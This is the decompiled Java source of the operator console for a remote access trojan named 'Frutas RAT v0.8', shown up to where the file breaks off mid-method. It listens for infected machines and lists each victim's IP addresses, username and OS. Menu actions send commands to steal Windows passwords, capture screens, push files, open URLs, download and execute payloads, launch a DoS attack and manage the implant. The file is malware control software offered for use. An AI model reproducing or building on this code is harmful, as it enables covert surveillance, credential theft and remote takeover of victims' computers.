/*     */ package cliente;
/*     */ 
/*     */ import Extras.JdeskTopPanel;
/*     */ import java.awt.Color;
/*     */ import java.awt.Container;
/*     */ import java.awt.EventQueue;
/*     */ import java.awt.Font;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.awt.event.ActionListener;
/*     */ import java.awt.event.MouseAdapter;
/*     */ import java.awt.event.MouseEvent;
/*     */ import java.io.FileInputStream;
/*     */ import java.io.FileOutputStream;
/*     */ import java.io.IOException;
/*     */ import java.io.PrintStream;
/*     */ import java.util.HashMap;
/*     */ import java.util.Locale;
/*     */ import java.util.Properties;
/*     */ import java.util.ResourceBundle;
/*     */ import java.util.logging.Level;
/*     */ import java.util.logging.Logger;
/*     */ import javax.swing.DropMode;
/*     */ import javax.swing.GroupLayout;
/*     */ import javax.swing.GroupLayout.Alignment;
/*     */ import javax.swing.GroupLayout.ParallelGroup;
/*     */ import javax.swing.GroupLayout.SequentialGroup;
/*     */ import javax.swing.ImageIcon;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JFrame;
/*     */ import javax.swing.JInternalFrame;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JLayeredPane;
/*     */ import javax.swing.JMenu;
/*     */ import javax.swing.JMenuBar;
/*     */ import javax.swing.JMenuItem;
/*     */ import javax.swing.JOptionPane;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JPasswordField;
/*     */ import javax.swing.JPopupMenu;
/*     */ import javax.swing.JScrollPane;
/*     */ import javax.swing.JSpinner;
/*     */ import javax.swing.JTable;
/*     */ import javax.swing.KeyStroke;
/*     */ import javax.swing.LayoutStyle.ComponentPlacement;
/*     */ import javax.swing.ListSelectionModel;
/*     */ import javax.swing.SpinnerNumberModel;
/*     */ import javax.swing.UIManager;
/*     */ import javax.swing.table.DefaultTableCellRenderer;
/*     */ import javax.swing.table.DefaultTableModel;
/*     */ import javax.swing.table.JTableHeader;
/*     */ import javax.swing.table.TableColumn;
/*     */ import javax.swing.table.TableColumnModel;
/*     */ 
/*     */ public class FrutaManager extends JFrame
/*     */ {
/*  25 */   public ResourceBundle idioma = ResourceBundle.getBundle("idiomas/0", Locale.getDefault());
/*  26 */   public ResourceBundle idiomaanterios = ResourceBundle.getBundle("idiomas/0", Locale.getDefault());
/*     */   private Escucha escucha;
/*     */   private Escucha2 escucha2;
/*     */   private DefaultTableModel modelotabla;
/*     */   private JMenu acerca;
/*     */   private JMenuItem actualiza;
/*     */   private JMenuItem autor;
/*     */   private JButton botonListen;
/*     */   private JMenuItem capturaPantalla;
/*     */   private JMenu central;
/*     */   private JMenuItem cierraConexion;
/*     */   private JLabel conectados;
/*     */   private JMenuItem contrasena;
/*     */   private JMenuItem desinstala;
/*     */   private JMenuItem dos;
/*     */   private JMenuItem download;
/*     */   private JMenuItem enviaArchivo;
/*     */   private JMenuItem filemanager;
/*     */   private JMenuItem idiomasss;
/*     */   private JMenu jMenu1;
/*     */   private JMenuBar jMenuBar1;
/*     */   private JPanel jPanel1;
/*     */   private JPopupMenu jPopupMenu1;
/*     */   private JScrollPane jScrollPane1;
/*     */   public JdeskTopPanel jdeskTopPanel1;
/*     */   private JLabel labelconectados;
/*     */   private JLabel labelpass;
/*     */   private JLabel labelpuerto;
/*     */   private JLabel labelpuerto2;
/*     */   private JMenuItem mensaje;
/*     */   private JMenuItem newServer;
/*     */   private JMenuItem openport;
/*     */   public JPasswordField pass;
/*     */   private JSpinner puerto;
/*     */   private JSpinner puerto2;
/*     */   private JMenuItem reinicia;
/*     */   private JButton saveConfig;
/*     */   private JTable tabla;
/*     */   private JMenuItem urlSend;
/*     */   private JInternalFrame usuariosTotal;
/*     */ 
/*     */   public FrutaManager()
/*     */   {
/*  38 */     initComponents();
/*  39 */     this.tabla.getColumnModel().getColumn(0).setCellRenderer(new celban());
/*     */ 
/*  41 */     this.modelotabla = ((DefaultTableModel)this.tabla.getModel());
/*  42 */     setLocationRelativeTo(null);
/*  43 */     loadConfig();
/*     */   }
/*     */ 
/*     */   public synchronized void ModificaTabla(String User, String[] Datos, boolean todos)
/*     */   {
/*  48 */     synchronized (this.tabla)
/*     */     {
/*  50 */       if (todos == true)
/*     */       {
/*  53 */         for (int i = this.tabla.getRowCount() - 1; i > -1; i--)
/*     */         {
/*  55 */           Usuario tmp = (Usuario)Escucha.USUARIOS.get(this.tabla.getValueAt(i, 1).toString());
/*  56 */           tmp.CierraConexion();
/*  57 */           System.out.println("Cerre conexion de: " + tmp.getIdentificador());
/*     */         }
/*     */ 
/*  61 */         Escucha.USUARIOS.clear();
/*  62 */         this.conectados.setText(Escucha.USUARIOS.size() + "");
/*  63 */         return;
/*     */       }
/*     */ 
/*  66 */       if (User.isEmpty()) {
/*  67 */         this.modelotabla.addRow(Datos);
/*  68 */         this.conectados.setText(Escucha.USUARIOS.size() + "");
/*     */       }
/*     */       else
/*     */       {
/*  72 */         for (int i = 0; i < this.tabla.getRowCount(); i++) {
/*  73 */           if (this.tabla.getValueAt(i, 1).toString().equalsIgnoreCase(User)) {
/*  74 */             this.modelotabla.removeRow(i);
/*  75 */             Escucha.USUARIOS.remove(User);
/*     */           }
/*     */ 
/*     */         }
/*     */ 
/*  80 */         this.conectados.setText(Escucha.USUARIOS.size() + "");
/*     */       }
/*     */     }
/*     */   }
/*     */ 
/*     */   private void initComponents()
/*     */   {
/*  91 */     this.jPopupMenu1 = new JPopupMenu();
/*  92 */     this.mensaje = new JMenuItem();
/*  93 */     this.contrasena = new JMenuItem();
/*  94 */     this.urlSend = new JMenuItem();
/*  95 */     this.enviaArchivo = new JMenuItem();
/*  96 */     this.capturaPantalla = new JMenuItem();
/*  97 */     this.dos = new JMenuItem();
/*  98 */     this.filemanager = new JMenuItem();
/*  99 */     this.download = new JMenuItem();
/* 100 */     this.jMenu1 = new JMenu();
/* 101 */     this.cierraConexion = new JMenuItem();
/* 102 */     this.reinicia = new JMenuItem();
/* 103 */     this.actualiza = new JMenuItem();
/* 104 */     this.desinstala = new JMenuItem();
/* 105 */     this.jdeskTopPanel1 = new JdeskTopPanel();
/* 106 */     this.usuariosTotal = new JInternalFrame();
/* 107 */     this.jScrollPane1 = new JScrollPane();
/* 108 */     this.tabla = new JTable();
/* 109 */     this.jPanel1 = new JPanel();
/* 110 */     this.labelpuerto = new JLabel();
/* 111 */     this.puerto = new JSpinner();
/* 112 */     this.botonListen = new JButton();
/* 113 */     this.labelpass = new JLabel();
/* 114 */     this.pass = new JPasswordField();
/* 115 */     this.labelpuerto2 = new JLabel();
/* 116 */     this.puerto2 = new JSpinner();
/* 117 */     this.labelconectados = new JLabel();
/* 118 */     this.conectados = new JLabel();
/* 119 */     this.saveConfig = new JButton();
/* 120 */     this.jMenuBar1 = new JMenuBar();
/* 121 */     this.central = new JMenu();
/* 122 */     this.newServer = new JMenuItem();
/* 123 */     this.idiomasss = new JMenuItem();
/* 124 */     this.openport = new JMenuItem();
/* 125 */     this.acerca = new JMenu();
/* 126 */     this.autor = new JMenuItem();
/*     */ 
/* 128 */     this.mensaje.setIcon(new ImageIcon(getClass().getResource("/resources/style_edit.png")));
/* 129 */     this.mensaje.setText("Mensajes Falsos");
/* 130 */     this.mensaje.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/* 132 */         FrutaManager.this.mensajeActionPerformed(evt);
/*     */       }
/*     */     });
/* 135 */     this.jPopupMenu1.add(this.mensaje);
/*     */ 
/* 137 */     this.contrasena.setIcon(new ImageIcon(getClass().getResource("/resources/vcard_add.png")));
/* 138 */     this.contrasena.setText("Contraseñas (Windows)");
/* 139 */     this.contrasena.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/* 141 */         FrutaManager.this.contrasenaActionPerformed(evt);
/*     */       }
/*     */     });
/* 144 */     this.jPopupMenu1.add(this.contrasena);
/*     */ 
/* 146 */     this.urlSend.setIcon(new ImageIcon(getClass().getResource("/resources/world_link.png")));
/* 147 */     this.urlSend.setText("Abrir URL");
/* 148 */     this.urlSend.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/* 150 */         FrutaManager.this.urlSendActionPerformed(evt);
/*     */       }
/*     */     });
/* 153 */     this.jPopupMenu1.add(this.urlSend);
/*     */ 
/* 155 */     this.enviaArchivo.setIcon(new ImageIcon(getClass().getResource("/resources/computer_go.png")));
/* 156 */     this.enviaArchivo.setText("Enviar Archivo");
/* 157 */     this.enviaArchivo.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/* 159 */         FrutaManager.this.enviaArchivoActionPerformed(evt);
/*     */       }
/*     */     });
/* 162 */     this.jPopupMenu1.add(this.enviaArchivo);
/*     */ 
/* 164 */     this.capturaPantalla.setIcon(new ImageIcon(getClass().getResource("/resources/image_add.png")));
/* 165 */     this.capturaPantalla.setText("Captura de Pantalla");
/* 166 */     this.capturaPantalla.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/* 168 */         FrutaManager.this.capturaPantallaActionPerformed(evt);
/*     */       }
/*     */     });
/* 171 */     this.jPopupMenu1.add(this.capturaPantalla);
/*     */ 
/* 173 */     this.dos.setIcon(new ImageIcon(getClass().getResource("/resources/application_osx_terminal.png")));
/* 174 */     this.dos.setText("Ataque D.o.S");
/* 175 */     this.dos.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/* 177 */         FrutaManager.this.dosActionPerformed(evt);
/*     */       }
/*     */     });
/* 180 */     this.jPopupMenu1.add(this.dos);
/*     */ 
/* 182 */     this.filemanager.setText("Administrador de Archivos");
/* 183 */     this.filemanager.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/* 185 */         FrutaManager.this.filemanagerActionPerformed(evt);
/*     */       }
/*     */     });
/* 188 */     this.jPopupMenu1.add(this.filemanager);
/*     */ 
/* 190 */     this.download.setText("Descarga y Ejecuta");
/* 191 */     this.download.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/* 193 */         FrutaManager.this.downloadActionPerformed(evt);
/*     */       }
/*     */     });
/* 196 */     this.jPopupMenu1.add(this.download);
/*     */ 
/* 198 */     this.jMenu1.setText("Server");
/*     */ 
/* 200 */     this.cierraConexion.setIcon(new ImageIcon(getClass().getResource("/resources/action_stop.gif")));
/* 201 */     this.cierraConexion.setText("Parar Conexion");
/* 202 */     this.cierraConexion.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/* 204 */         FrutaManager.this.cierraConexionActionPerformed(evt);
/*     */       }
/*     */     });
/* 207 */     this.jMenu1.add(this.cierraConexion);
/*     */ 
/* 209 */     this.reinicia.setIcon(new ImageIcon(getClass().getResource("/resources/action_refresh.gif")));
/* 210 */     this.reinicia.setText("Reiniciar Conexion");
/* 211 */     this.reinicia.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/* 213 */         FrutaManager.this.reiniciaActionPerformed(evt);
/*     */       }
/*     */     });
/* 216 */     this.jMenu1.add(this.reinicia);
/*     */ 
/* 218 */     this.actualiza.setText("Actualizar");
/* 219 */     this.actualiza.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/* 221 */         FrutaManager.this.actualizaActionPerformed(evt);
/*     */       }
/*     */     });
/* 224 */     this.jMenu1.add(this.actualiza);
/*     */ 
/* 226 */     this.desinstala.setText("Desinstalar");
/* 227 */     this.desinstala.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/* 229 */         FrutaManager.this.desinstalaActionPerformed(evt);
/*     */       }
/*     */     });
/* 232 */     this.jMenu1.add(this.desinstala);
/*     */ 
/* 234 */     this.jPopupMenu1.add(this.jMenu1);
/*     */ 
/* 236 */     setDefaultCloseOperation(3);
/* 237 */     setTitle("Frutas RAT v0.8 [Vesión Naranja]");
/*     */ 
/* 239 */     this.usuariosTotal.setIconifiable(true);
/* 240 */     this.usuariosTotal.setMaximizable(true);
/* 241 */     this.usuariosTotal.setResizable(true);
/* 242 */     this.usuariosTotal.setTitle("Usuarios");
/* 243 */     this.usuariosTotal.setVisible(true);
/*     */ 
/* 245 */     this.tabla.setAutoCreateRowSorter(true);
/* 246 */     this.tabla.setModel(new DefaultTableModel(new Object[0][], new String[] { "País", "Identificador", "IP Externa", "IP Interna", "Usuario PC", "S.O.", "Versión  JRE", "Versión" })
/*     */     {
/* 254 */       boolean[] canEdit = { false, false, false, false, false, false, false, false };
/*     */ 
/*     */       public boolean isCellEditable(int rowIndex, int columnIndex)
/*     */       {
/* 259 */         return this.canEdit[columnIndex];
/*     */       }
/*     */     });
/* 262 */     this.tabla.setComponentPopupMenu(this.jPopupMenu1);
/* 263 */     this.tabla.setDropMode(DropMode.ON);
/* 264 */     this.tabla.setRowHeight(32);
/* 265 */     this.tabla.setSelectionMode(2);
/* 266 */     this.tabla.getTableHeader().setReorderingAllowed(false);
/* 267 */     this.tabla.addMouseListener(new MouseAdapter() {
/*     */       public void mouseClicked(MouseEvent evt) {
/* 269 */         FrutaManager.this.tablaMouseClicked(evt);
/*     */       }
/*     */       public void mousePressed(MouseEvent evt) {
/* 272 */         FrutaManager.this.tablaMousePressed(evt);
/*     */       }
/*     */     });
/* 275 */     this.jScrollPane1.setViewportView(this.tabla);
/* 276 */     this.tabla.getColumnModel().getColumn(0).setMinWidth(65);
/* 277 */     this.tabla.getColumnModel().getColumn(0).setPreferredWidth(65);
/* 278 */     this.tabla.getColumnModel().getColumn(0).setMaxWidth(66);
/* 279 */     this.tabla.getColumnModel().getColumn(7).setMinWidth(59);
/* 280 */     this.tabla.getColumnModel().getColumn(7).setPreferredWidth(59);
/* 281 */     this.tabla.getColumnModel().getColumn(7).setMaxWidth(60);
/*     */ 
/* 283 */     this.jPanel1.setBackground(new Color(255, 255, 153));
/*     */ 
/* 285 */     this.labelpuerto.setFont(new Font("Times New Roman", 1, 14));
/* 286 */     this.labelpuerto.setForeground(new Color(102, 0, 102));
/* 287 */     this.labelpuerto.setText("Puerto 1:");
/*     */ 
/* 289 */     this.puerto.setFont(new Font("Arial Black", 0, 12));
/* 290 */     this.puerto.setModel(new SpinnerNumberModel(1000, 1, 65000, 1));
/*     */ 
/* 292 */     this.botonListen.setFont(new Font("Arial Black", 0, 12));
/* 293 */     this.botonListen.setForeground(new Color(102, 0, 102));
/* 294 */     this.botonListen.setIcon(new ImageIcon(getClass().getResource("/resources/connect.png")));
/* 295 */     this.botonListen.setText("Escuchar");
/* 296 */     this.botonListen.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/* 298 */         FrutaManager.this.botonListenActionPerformed(evt);
/*     */       }
/*     */     });
/* 302 */     this.labelpass.setFont(new Font("Arial Black", 0, 12));
/* 303 */     this.labelpass.setForeground(new Color(102, 0, 102));
/* 304 */     this.labelpass.setText("Contraseña:");
/*     */ 
/* 306 */     this.pass.setFont(new Font("Arial Black", 0, 12));
/* 307 */     this.pass.setForeground(new Color(102, 0, 102));
/* 308 */     this.pass.setText("XXXX");
/*     */ 
/* 310 */     this.labelpuerto2.setFont(new Font("Arial Black", 0, 12));
/* 311 */     this.labelpuerto2.setForeground(new Color(102, 0, 102));
/* 312 */     this.labelpuerto2.setText("Puerto 2:");
/*     */ 
/* 314 */     this.puerto2.setFont(new Font("Arial Black", 0, 12));
/* 315 */     this.puerto2.setModel(new SpinnerNumberModel(1001, 1, 65000, 1));
/*     */ 
/* 317 */     this.labelconectados.setFont(new Font("Arial Black", 0, 12));
/* 318 */     this.labelconectados.setForeground(new Color(102, 0, 102));
/* 319 */     this.labelconectados.setText("Conectados: ");
/*     */ 
/* 321 */     this.conectados.setFont(new Font("Arial Black", 0, 12));
/* 322 */     this.conectados.setForeground(new Color(102, 0, 102));
/* 323 */     this.conectados.setText("0");
/*     */ 
/* 325 */     this.saveConfig.setIcon(new ImageIcon(getClass().getResource("/resources/action_save.gif")));
/* 326 */     this.saveConfig.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/* 328 */         FrutaManager.this.saveConfigActionPerformed(evt);
/*     */       }
/*     */     });
/* 332 */     GroupLayout jPanel1Layout = new GroupLayout(this.jPanel1);
/* 333 */     this.jPanel1.setLayout(jPanel1Layout);
/* 334 */     jPanel1Layout.setHorizontalGroup(jPanel1Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jPanel1Layout.createSequentialGroup().addContainerGap().addComponent(this.labelpuerto).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.puerto, -2, 75, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.labelpuerto2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.puerto2, -2, 75, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.botonListen).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.saveConfig, -2, 25, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.labelpass, -2, 86, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.pass, -2, 87, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.labelconectados).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.conectados, -1, 60, 32767).addContainerGap()));
/*     */ 
/* 359 */     jPanel1Layout.setVerticalGroup(jPanel1Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jPanel1Layout.createSequentialGroup().addContainerGap().addGroup(jPanel1Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jPanel1Layout.createParallelGroup(GroupLayout.Alignment.BASELINE).addComponent(this.labelpuerto2).addComponent(this.puerto2, -2, -1, -2).addComponent(this.botonListen).addComponent(this.labelpass).addComponent(this.pass, -2, -1, -2).addComponent(this.labelconectados).addComponent(this.conectados).addComponent(this.saveConfig)).addGroup(jPanel1Layout.createParallelGroup(GroupLayout.Alignment.BASELINE).addComponent(this.labelpuerto).addComponent(this.puerto, -2, -1, -2))).addContainerGap(13, 32767)));
/*     */ 
/* 379 */     GroupLayout usuariosTotalLayout = new GroupLayout(this.usuariosTotal.getContentPane());
/* 380 */     this.usuariosTotal.getContentPane().setLayout(usuariosTotalLayout);
/* 381 */     usuariosTotalLayout.setHorizontalGroup(usuariosTotalLayout.createParallelGroup(GroupLayout.Alignment.LEADING).addComponent(this.jPanel1, -1, -1, 32767).addComponent(this.jScrollPane1));
/*     */ 
/* 386 */     usuariosTotalLayout.setVerticalGroup(usuariosTotalLayout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(GroupLayout.Alignment.TRAILING, usuariosTotalLayout.createSequentialGroup().addComponent(this.jPanel1, -2, -1, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jScrollPane1, -1, 204, 32767)));
/*     */ 
/* 394 */     this.usuariosTotal.setBounds(60, 30, 800, 290);
/* 395 */     this.jdeskTopPanel1.add(this.usuariosTotal, JLayeredPane.DEFAULT_LAYER);
/*     */ 
/* 397 */     this.central.setText("Central");
/*     */ 
/* 399 */     this.newServer.setAccelerator(KeyStroke.getKeyStroke(78, 2));
/* 400 */     this.newServer.setIcon(new ImageIcon(getClass().getResource("/resources/nuevoServer.png")));
/* 401 */     this.newServer.setText("Nuevo Server");
/* 402 */     this.newServer.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/* 404 */         FrutaManager.this.newServerActionPerformed(evt);
/*     */       }
/*     */     });
/* 407 */     this.central.add(this.newServer);
/*     */ 
/* 409 */     this.idiomasss.setAccelerator(KeyStroke.getKeyStroke(73, 2));
/* 410 */     this.idiomasss.setIcon(new ImageIcon(getClass().getResource("/resources/idioma.png")));
/* 411 */     this.idiomasss.setText("Idiomas");
/* 412 */     this.idiomasss.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/* 414 */         FrutaManager.this.idiomasssActionPerformed(evt);
/*     */       }
/*     */     });
/* 417 */     this.central.add(this.idiomasss);
/*     */ 
/* 419 */     this.openport.setAccelerator(KeyStroke.getKeyStroke(72, 2));
/* 420 */     this.openport.setIcon(new ImageIcon(getClass().getResource("/resources/herramieta.png")));
/* 421 */     this.openport.setText("Herramientas");
/* 422 */     this.openport.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/* 424 */         FrutaManager.this.openportActionPerformed(evt);
/*     */       }
/*     */     });
/* 427 */     this.central.add(this.openport);
/*     */ 
/* 429 */     this.jMenuBar1.add(this.central);
/*     */ 
/* 431 */     this.acerca.setText("Acerca");
/*     */ 
/* 433 */     this.autor.setAccelerator(KeyStroke.getKeyStroke(65, 2));
/* 434 */     this.autor.setIcon(new ImageIcon(getClass().getResource("/resources/autor.png")));
/* 435 */     this.autor.setText("Autor");
/* 436 */     this.autor.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/* 438 */         FrutaManager.this.autorActionPerformed(evt);
/*     */       }
/*     */     });
/* 441 */     this.acerca.add(this.autor);
/*     */ 
/* 443 */     this.jMenuBar1.add(this.acerca);
/*     */ 
/* 445 */     setJMenuBar(this.jMenuBar1);
/*     */ 
/* 447 */     GroupLayout layout = new GroupLayout(getContentPane());
/* 448 */     getContentPane().setLayout(layout);
/* 449 */     layout.setHorizontalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addComponent(this.jdeskTopPanel1, -1, 925, 32767));
/*     */ 
/* 453 */     layout.setVerticalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addComponent(this.jdeskTopPanel1, -1, 429, 32767));
/*     */ 
/* 458 */     pack();
/*     */   }
/*     */ 
/*     */   private void botonListenActionPerformed(ActionEvent evt) {
/* 462 */     ConectaoDesconectaPuerto();
/*     */   }
/*     */ 
/*     */   public void ConectaoDesconectaPuerto()
/*     */   {
/* 467 */     System.out.println("Numeros: " + Escucha.USUARIOS.size());
/*     */     try {
/* 469 */       if (this.botonListen.getText().equalsIgnoreCase(this.idioma.getString("boton.escucha.activado"))) {
/* 470 */         int port = Integer.parseInt(this.puerto.getValue().toString());
/* 471 */         int port2 = Integer.parseInt(this.puerto2.getValue().toString());
/* 472 */         this.escucha = new Escucha(port, 100, this);
/* 473 */         this.escucha2 = new Escucha2(port2, 100, this);
/* 474 */         this.escucha.start();
/* 475 */         this.escucha2.start();
/* 476 */         this.botonListen.setText(this.idioma.getString("boton.escucha.desactivado"));
/* 477 */         this.puerto.setEnabled(false);
/* 478 */         this.puerto2.setEnabled(false);
/* 479 */         this.pass.setEnabled(false);
/*     */       } else {
/* 481 */         this.escucha.stopPara();
/* 482 */         this.escucha2.stopPara();
/* 483 */         ModificaTabla(null, null, true);
/* 484 */         this.botonListen.setText(this.idioma.getString("boton.escucha.activado"));
/* 485 */         this.puerto.setEnabled(true);
/* 486 */         this.puerto2.setEnabled(true);
/* 487 */         this.pass.setEnabled(true);
/*     */       }
/*     */     } catch (IOException ex) {
/* 490 */       Logger.getLogger(FrutaManager.class.getName()).log(Level.SEVERE, null, ex);
/*     */     }
/*     */   }
/*     */ 
/*     */   private void tablaMouseClicked(MouseEvent evt)
/*     */   {
/*     */   }
/*     */ 
/*     */   private void tablaMousePressed(MouseEvent evt)
/*     */   {
/* 509 */     if (this.tabla.getSelectedRowCount() <= 1) {
/* 510 */       int t = this.tabla.rowAtPoint(evt.getPoint());
/*     */ 
/* 512 */       this.tabla.getSelectionModel().setSelectionInterval(t, t);
/*     */     }
/*     */   }
/*     */ 
/*     */   private void mensajeActionPerformed(ActionEvent evt)
/*     */   {
/* 536 */     int[] selec = this.tabla.getSelectedRows();
/* 537 */     System.out.println(selec.length);
/* 538 */     Usuario[] user = new Usuario[selec.length];
/* 539 */     for (int i = 0; i < selec.length; i++) {
/* 540 */       String seleccionado = this.tabla.getValueAt(selec[i], 1).toString();
/* 541 */       user[i] = Escucha.listGet(seleccionado);
/*     */     }
/*     */ 
/* 547 */     GUIMensajes m = new GUIMensajes(user, this.idioma);
/* 548 */     m.setVisible(true);
/* 549 */     m.setLocation(100, 100);
/* 550 */     this.jdeskTopPanel1.add(m, 0);
/*     */   }
/*     */ 
/*     */   private void enviaArchivoActionPerformed(ActionEvent evt)
/*     */   {
/* 555 */     if (this.tabla.getSelectedRows().length > 1) {
/* 556 */       JOptionPane.showMessageDialog(this, "Esta opcion no esta disponible paramultiple seleccion...");
/*     */ 
/* 558 */       return;
/* 559 */     }String seleccionado = this.tabla.getValueAt(this.tabla.getSelectedRow(), 1).toString();
/* 560 */     Usuario tmp = (Usuario)Escucha.USUARIOS.get(seleccionado);
/* 561 */     tmp.sendComando(2);
/*     */   }
/*     */ 
/*     */   private void cierraConexionActionPerformed(ActionEvent evt)
/*     */   {
/* 572 */     if (this.tabla.getRowCount() == 0) {
/* 573 */       return;
/*     */     }
/*     */ 
/* 582 */     int[] selec = this.tabla.getSelectedRows();
/* 583 */     System.out.println(selec.length);
/* 584 */     Usuario[] user = new Usuario[selec.length];
/* 585 */     for (int i = 0; i < selec.length; i++) {
/* 586 */       String seleccionado = this.tabla.getValueAt(selec[i], 1).toString();
/* 587 */       user[i] = Escucha.listGet(seleccionado);
/* 588 */       user[i].sendComando(3);
/*     */     }
/*     */   }
/*     */ 
/*     */   private void reiniciaActionPerformed(ActionEvent evt)
/*     */   {
/* 601 */     if (this.tabla.getRowCount() == 0) {
/* 602 */       return;
/*     */     }
/*     */ 
/* 611 */     int[] selec = this.tabla.getSelectedRows();
/* 612 */     System.out.println(selec.length);
/* 613 */     Usuario[] user = new Usuario[selec.length];
/* 614 */     for (int i = 0; i < selec.length; i++) {
/* 615 */       String seleccionado = this.tabla.getValueAt(selec[i], 1).toString();
/* 616 */       user[i] = Escucha.listGet(seleccionado);
/* 617 */       user[i].sendComando(4);
/*     */     }
/*     */   }
/*     */ 
/*     */   private void autorActionPerformed(ActionEvent evt)
/*     */   {
/* 629 */     Acerca auto = new Acerca(this.idioma);
/* 630 */     int altoPantalla = this.jdeskTopPanel1.getHeight() / 2;
/* 631 */     int anchoPantalla = this.jdeskTopPanel1.getWidth() / 2;
/* 632 */     int altoAplicacion = auto.getHeight() / 2;
/* 633 */     int anchoAplicacion = auto.getWidth() / 2;
/*     */ 
/* 635 */     auto.setLocation(anchoPantalla - anchoAplicacion, altoPantalla - altoAplicacion);
/* 636 */     auto.setVisible(true);
/* 637 */     this.jdeskTopPanel1.add(auto, 0);
/*     */   }
/*     */ 
/*     */   private void newServerActionPerformed(ActionEvent evt)
/*     */   {
/* 642 */     NewServer auto = new NewServer(this.idioma);
/* 643 */     int altoPantalla = this.jdeskTopPanel1.getHeight() / 2;
/* 644 */     int anchoPantalla = this.jdeskTopPanel1.getWidth() / 2;
/* 645 */     int altoAplicacion = auto.getHeight() / 2;
/* 646 */     int anchoAplicacion = auto.getWidth() / 2;
/* 647 */     auto.setLocation(anchoPantalla - anchoAplicacion, altoPantalla - altoAplicacion);
/* 648 */     auto.setVisible(true);
/* 649 */     this.jdeskTopPanel1.add(auto, 0);
/*     */   }
/*     */ 
/*     */   private void urlSendActionPerformed(ActionEvent evt)
/*     */   {
/* 662 */     int[] selec = this.tabla.getSelectedRows();
/* 663 */     Usuario[] user = new Usuario[selec.length];
/* 664 */     for (int i = 0; i < selec.length; i++) {
/* 665 */       String seleccionado = this.tabla.getValueAt(selec[i], 1).toString();
/* 666 */       user[i] = Escucha.listGet(seleccionado);
/*     */     }
/*     */ 
/* 671 */     AbrirPaginaRemota auto = new AbrirPaginaRemota(user, this.idioma);
/* 672 */     int altoPantalla = this.jdeskTopPanel1.getHeight() / 2;
/* 673 */     int anchoPantalla = this.jdeskTopPanel1.getWidth() / 2;
/* 674 */     int altoAplicacion = auto.getHeight() / 2;
/* 675 */     int anchoAplicacion = auto.getWidth() / 2;
/* 676 */     auto.setLocation(anchoPantalla - anchoAplicacion, altoPantalla - altoAplicacion);
/* 677 */     auto.setVisible(true);
/* 678 */     this.jdeskTopPanel1.add(auto, 0);
/*     */   }
/*     */ 
/*     */   private void contrasenaActionPerformed(ActionEvent evt)
/*     */   {
/* 685 */     if (this.tabla.getSelectedRows().length > 1) {
/* 686 */       JOptionPane.showMessageDialog(this, "Esta opcion no esta disponible paramultiple seleccion...");
/*     */ 
/* 688 */       return;
/*     */     }
/* 690 */     String seleccionado = this.tabla.getValueAt(this.tabla.getSelectedRow(), 1).toString();
/*     */ 
/* 702 */     Usuario tmp = (Usuario)Escucha.USUARIOS.get(seleccionado);
/* 703 */     tmp.sendComando(6);
/*     */   }
/*     */ 
/*     */   public void setIdioma(ResourceBundle rb)
/*     */   {
/* 714 */     this.idioma = rb;
/*     */ 
/* 716 */     this.mensaje.setText(rb.getString("popup.mensaje"));
/* 717 */     this.contrasena.setText(rb.getString("popup.contrasena"));
/* 718 */     this.urlSend.setText(rb.getString("popup.url"));
/* 719 */     this.enviaArchivo.setText(rb.getString("popup.envia"));
/* 720 */     this.cierraConexion.setText(rb.getString("popup.para"));
/* 721 */     this.reinicia.setText(rb.getString("popup.reinicia"));
/* 722 */     this.desinstala.setText(rb.getString("popup.desintala"));
/* 723 */     this.capturaPantalla.setText(rb.getString("popup.captura"));
/* 724 */     this.dos.setText(rb.getString("popup.dos"));
/* 725 */     this.filemanager.setText(rb.getString("popup.archivos"));
/*     */ 
/* 728 */     setTitle(rb.getString("nombre.rat") + "  " + rb.getString("idioma.autor"));
/* 729 */     this.central.setText(rb.getString("barra1.central"));
/* 730 */     this.idiomasss.setText(rb.getString("barra1.lenguaje"));
/*     */ 
/* 732 */     this.newServer.setText(rb.getString("barra1.nuevoserver"));
